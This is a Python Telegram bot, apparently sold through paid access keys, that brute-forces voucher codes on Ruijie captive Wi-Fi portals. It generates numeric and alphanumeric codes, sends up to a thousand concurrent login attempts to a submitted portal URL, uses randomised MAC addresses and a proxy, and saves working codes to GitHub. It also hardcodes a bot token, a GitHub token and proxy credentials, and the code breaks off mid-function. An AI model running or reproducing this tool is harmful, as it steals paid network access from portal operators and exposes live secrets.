import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8867816797:AAFXkNP8MJEIjAHZRsRAUDhAn_EgmeLYowg"
GITHUB_TOKEN = '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'
REPO_OWNER = "makkqt"
REPO_NAME = "yes"

# ==================== ADMIN CONFIGURATION ====================
ADMINлю = [
    "7366841341",     # @kuranomi10 (Main Admin)
    "8728200516"      # @makxcross_admin (Co-Admin)
]
ADMINS = [
    "7366841341",
    "8728200516"
]

ADMIN_USERNAME = "@kuranomi10 | @makxcross_admin"

def is_admin(user_id):
    return str(user_id) in ADMINS

# ==================== PROXY CONFIGURATION ====================
PROXY_URL = "http://qtbrstqq:fa915rth9mt3@31.59.20.176:6754/"

def get_proxy():
    return PROXY_URL

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 1000
_voucher_sem = None
_start_time = time.monotonic()

MAX_CONCURRENT_SCANS = 20
active_scans_count = 0
active_scans_lock = asyncio.Lock()

paid_users = {}

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

def get_main_keyboard(user_id):
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    if is_admin(user_id):
        keyboard.add(InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
    return keyboard

def get_admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"),
        InlineKeyboardButton("📊 Bot Status", callback_data="admin_status"),
        InlineKeyboardButton("🔙 Main Menu", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး (x3kark)", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး (8twcqeb)", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    auth_list, _ = await get_file_content("auth_list.json")
    
    is_user_paid = False
    if user_id in auth_list:
        if check_key_expiration(auth_list[user_id]):
            is_user_paid = True
            approve[message.chat.id] = True
            paid_users[user_id] = True

    if is_user_paid or is_admin(user_id):
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    else:
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။
Admin ထံတွင် Key ဝယ်ယူရန် ဆက်သွယ်ပါ။
👨‍💻 Admin: {ADMIN_USERNAME}"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if not is_admin(message.chat.id):
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [your_message]")
        return
    
    broadcast_text = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
    auth_list, _ = await get_file_content("auth_list.json")
    
    count = 0
    for uid in auth_list:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
            
    await bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    auth_list, _ = await get_file_content("auth_list.json")
    is_user_paid = False
    if user_id in auth_list and check_key_expiration(auth_list[user_id]):
        is_user_paid = True
    
    if call.data == "menu_back":
        if is_user_paid or is_admin(user_id):
            text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ PAID USER - Unlimited Access"""
        else:
            text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။
Admin: {ADMIN_USERNAME}"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard(user_id)
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data == "admin_panel":
        if not is_admin(user_id):
            await bot.answer_callback_query(call.id, "Permission Denied", show_alert=True)
            return
        admin_text = f"""👑 **ADMIN CONTROL PANEL**

Welcome Admin, select an option below or use commands:
• `/genkey [plan] [user_id]` - Generate Key
• `/delkey [user_id]` - Delete Key
• `/listkeys` - List all keys
• `/status` - Bot Status"""
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=admin_text,
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data == "admin_listkeys":
        if not is_admin(user_id):
            await bot.answer_callback_query(call.id, "Permission Denied", show_alert=True)
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                expires_str = "Unlimited" if expires == "9999-12-31T23:59:59Z" else expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid} | Plan: {plan} | Exp: {expires_str}")
        text = f"📋 **Registered Keys ({len(auth_list)})**\n\n" + ("\n".join(lines) if lines else "No keys found.")
        if len(text) > 4096:
            text = text[:4093] + "..."
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data == "admin_status":
        if not is_admin(user_id):
            await bot.answer_callback_query(call.id, "Permission Denied", show_alert=True)
            return
        active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
        uptime_seconds = int(time.monotonic() - _start_time)
        hours, remainder = divmod(uptime_seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        status_text = f"📊 **Bot Status**\n\n⏱ Uptime: {hours}h {minutes}m {seconds}s\n🔍 Active Scans: {active_scans}\n👥 Sessions: {len(user_data)}"
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=status_text,
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        if not is_user_paid and not is_admin(user_id):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:

/portal [your_portal_url]

ဥပမာ:
/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_start_scam":
        if not is_user_paid and not is_admin(user_id):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"⚠️ Bot အလုပ်များနေပါသည်။ လက်ရှိ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။",
                    reply_markup=get_back_keyboard()
                )
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1
        
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
                reply_markup=get_voucher_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=get_scam_button_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}",
            reply_markup=get_scam_button_keyboard(),
            parse_mode="Markdown"
        )
        
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        
        scan_tasks[chat_id] = {
            "task": task,
            "stop": False,
            "scan_id": scan_id
        }
        
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_result":
        if not is_user_paid and not is_admin(user_id):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        results, _ = await get_file_content("result.json")
        if user_id in results and results[user_id]:
            codes = "\n".join(results[user_id])
            text = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_recheck":
        if not is_user_paid and not is_admin(user_id):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔄 Recheck ကို စတင်နေပါသည်...",
            reply_markup=get_scam_button_keyboard()
        )
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data.startswith("scan_"):
        if not is_user_paid and not is_admin(user_id):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = call.data.replace("scan_", "")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=get_digit_keyboard(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        
        text = f"""🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}

✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        text = f"🔍 VOUCHER Mode: {mode}\n"
        if digit == "random":
            text += "🔢 ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
        else:
            text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
            
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

async def recheck_command(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    auth_list, _ = await get_file_content("auth_list.json")
    if not is_admin(user_id) and (user_id not in auth_list or not check_key_expiration(auth_list[user_id])):
        await bot.reply_to(message, f"⚠️ သင့်တွင် PAID USER မဟုတ်ပါ။ PAID USER ဝယ်ယူရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
        return
    
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        if message.chat.id not in user_data or "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        codes = results[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                expires_str = "Unlimited" if expires == "9999-12-31T23:59:59Z" else expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
        paid_users.pop(user_id, None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : {user_id}")
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey unlimited 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited")
            return
        auth_list, sha = await get_file_content("auth_list.json")
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
        await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID : {user_id}\nPLAN : {plan}\nEXPIRES : {expiry}")
    except Exception as e:
        print(f"Error at genkey {e}")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        return False
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    
    if not is_admin(user_id) and (user_id not in auth_list or not check_key_expiration(auth_list[user_id])):
        await bot.reply_to(message, f"❌ သင်၏ user ID မှာ PAID USER မဟုတ်သေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]")
        return
    url = args[1]
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
    
    if await check_session_url_improved(session_url=url):
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။", reply_markup=get_voucher_keyboard())
    else:
        await bot.reply_to(message, "❌ Portal URL မှားယွင်းနေပါသည်။", parse_mode="Markdown")

async def check_session_url_improved(session_url, use_proxy=False):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    proxy = get_proxy() if use_proxy else None
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=15) as response:
            if response.status >= 400:
                return False
            return True
    except Exception as e:
        print(f"Portal check error: {e}")
        return False

@bot.message_handler(commands=['status'])
async def status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(message, f"📊 Bot Status\n\n⏱ Uptime: {hours}h {minutes}m {seconds}s\n🔍 Active Scans: {active_scans}")

async def send_success_file(chat_id):
    if chat_id in success_texts and success_texts[chat_id]:
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content = "\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption="✅ Success Codes ဖိုင်အဖြစ် ပို့ပေးလိုက်ပါသည်။")
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            print(f"Error sending file: {e}")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        data["task"].cancel()
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def mixed_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    if mode == "mixed":
        while True:
            yield mixed_generator(6)
    if mode == "mixed8":
        while True:
            yield mixed_generator(8)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return f"🔍Scanning...\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Found : {found}\n[{bar}]"
    return f"🔍Scanning...\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Found : {found}"

BATCH_SIZE = 1000

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    total = (10 ** int(mode)) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return

            batch = [next(code_iter, None) for _ in range(BATCH_SIZE)]
            batch = [c for c in batch if c is not None]
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                pass
        await send_success_file(chat_id)
    finally:
        scan_tasks.pop(chat_id, None)
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            active_scans_count = max(0, active_scans_count - 1)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
